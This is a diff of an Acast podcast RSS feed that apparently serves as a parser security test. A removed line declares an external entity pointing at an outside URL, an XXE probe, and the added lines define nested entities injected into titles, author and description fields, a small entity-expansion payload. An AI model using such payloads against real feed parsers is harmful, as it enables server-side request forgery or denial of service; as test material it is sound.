@@ -1,20 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <?xml-stylesheet type="text/xsl" href="/global/feed/rss.xslt" ?>
-<!DOCTYPE nvld [ <!ENTITY dijaxcas SYSTEM "https://ebkr.heracross.reciber.owo.asodao/PO4"> ]>
+<!DOCTYPE rss [
+<!ENTITY test "INJECTED_VALUE">
+<!ENTITY test2 "&test; &test;">
+<!ENTITY test3 "&test2; &test2;">
+]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:media="http://search.yahoo.com/mrss/" xmlns:podaccess="https://access.acast.com/schema/1.0/" xmlns:acast="https://schema.acast.com/1.0/">
     <channel>
 		<ttl>60</ttl>
 		<generator>acast.com</generator>
-		<title>Baker PO4 </title>
+		<title>Baker &test; NAME TO MODIFY </title>
 		<link>https://feeds.acast.com/public/shows/baker-acast-podcast</link>
 		<atom:link href="https://feeds.acast.com/public/shows/6948f35df756711739ab860f" rel="self" type="application/rss+xml"/>
 		<language>es</language>
-		<copyright>Baker Evil</copyright>
+		<copyright>Baker Evil &test2;</copyright>
 		<itunes:keywords/>
-		<itunes:author>Baker Evil</itunes:author>
+		<itunes:author>Baker Evil &test3;</itunes:author>
 		<itunes:subtitle/>
-		<itunes:summary><![CDATA[This is my very interesting podcast<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></itunes:summary>
-		<description><![CDATA[This is my very interesting podcast<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></description>
+		<itunes:summary><![CDATA[This is my very interesting podcast &test;<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></itunes:summary>
+		<description><![CDATA[This is my very interesting podcast &test2;<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></description>
 		<itunes:explicit>false</itunes:explicit>
 		<itunes:owner>
 			<itunes:name>Baker Evil</itunes:name>
@@ -32,8 +36,8 @@
 				<title>Baker Acast Podcast</title>
 			</image>
 		<item>
-			<title>Titulo Acast</title>
-			<itunes:title>Titulo Acast</itunes:title>
+			<title>Titulo Acast &test3;</title>
+			<itunes:title>Titulo Acast &test;</itunes:title>
 			<pubDate>Mon, 22 Dec 2025 07:34:17 GMT</pubDate>
 			<itunes:duration>0:03</itunes:duration>
 			<enclosure url="https://sphinx.acast.com/p/open/s/6948f35df756711739ab860f/e/6948f476184761c021c6db08/media.mp3" length="18580" type="audio/mpeg"/>
@@ -47,8 +51,8 @@
 			<itunes:episodeType>full</itunes:episodeType>
 			<itunes:season>1</itunes:season>
 			<itunes:episode>1</itunes:episode>
-			<description><![CDATA[Resumen ACAST<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></description>
-			<itunes:summary><![CDATA[Resumen ACAST<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></itunes:summary>
+			<description><![CDATA[Resumen ACAST &test2;<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></description>
+			<itunes:summary><![CDATA[Resumen ACAST &test3;<hr><p style='color:grey; font-size:0.75em;'> Hosted on Acast. See <a style='color:grey;' target='_blank' rel='noopener noreferrer' href='https://acast.com/privacy'>acast.com/privacy</a> for more information.</p>]]></itunes:summary>
 		</item>
     	<itunes:category text="Comedy"/>
     </channel>
